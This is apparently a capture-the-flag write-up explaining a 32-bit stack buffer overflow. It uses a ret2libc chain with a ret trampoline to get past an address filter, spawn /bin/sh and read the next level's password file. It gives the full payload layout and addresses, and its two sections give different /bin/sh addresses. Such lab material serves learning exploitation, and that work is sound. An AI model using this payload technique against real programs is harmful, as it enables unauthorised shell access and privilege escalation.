# Buffer Overflow Payload — Summary

## **Full Payload**
"A"*80 + RET_ADDR + SYSTEM_ADDR + "A"*4 + BINSH_ADDR


---

##  **1. Buffer Fill (80 bytes)**
"A" * 80


**Purpose:** Fill the buffer completely until the saved return address.  
**Why:** We must overwrite RET to take control of program flow.

---

##  **2. RET Address (Trampoline)**
\x3e\x85\x04\x08 → 0x0804853e


**Purpose:** Safe address (does NOT start with `0xb`) so the program allows it.  
**Why:** Acts as a **trampoline** — execution jumps here and continues to the next value on the stack.

---

##  **3. system() Address**
\x60\xb0\xe6\xb7 → 0xb7e6b060


**Purpose:** Address of `system()`, the function that runs shell commands.

---

##  **4. Dummy Return Address**
"A"*4


**Purpose:** `system()` expects a return address.  
We don’t care where it returns → this is just filler (4 bytes).

---

##  **5. "/bin/sh" Address**
\x38\xf9\xff\xbf → 0xbffff938


**Purpose:** Argument passed to `system()` → tells it to execute `/bin/sh`.

---

##  **Execution Flow Diagram**
[1] "A"*80
↓ fills buffer
[2] RET_ADDR
↓ safe jump (bypasses filter)
[3] SYSTEM_ADDR
↓ system() executes
[4] "A"*4
↓ ignored return
[5] BINSH_ADDR
↓ argument to system()
[6] system("/bin/sh")
↓
SHELL OPEN 



---

##  **Summary Table**
| Part        | Value                | Purpose                           |
|-------------|----------------------|-----------------------------------|
| Buffer      | `"A"*80`             | Fill buffer to reach RET          |
| RET         | `0x0804853e`         | Allowed trampoline jump           |
| system()    | `0xb7e6b060`         | Call system()                     |
| Dummy ret   | `"A"*4`             | Placeholder return                |
| /bin/sh     | `0xbffff938`         | Argument for system()             |




# Level 2 – Exploit Diagram

Step-by-step memory layout after the overflow:

[ A * 80 bytes ]       --> fills buffer
[ 0x0804853e ]         --> first ret (safe trampoline)
[ 0xb7e6b060 ]         --> system()
[ "AAAA" ]             --> fake return address for system
[ 0xb7f8cc58 ]         --> pointer to "/bin/sh"

Execution flow:

1. gets() overflows the stack
2. return address overwritten with 0x0804853e
3. program returns to 0x0804853e (a ret instruction)
4. that ret pops the next value → system()
5. system() receives arguments:
      return addr = "AAAA"
      argument    = "/bin/sh"
6. system("/bin/sh") executes
7. interactive shell with EUID level3
8. cat /home/user/level3/.pass → flag
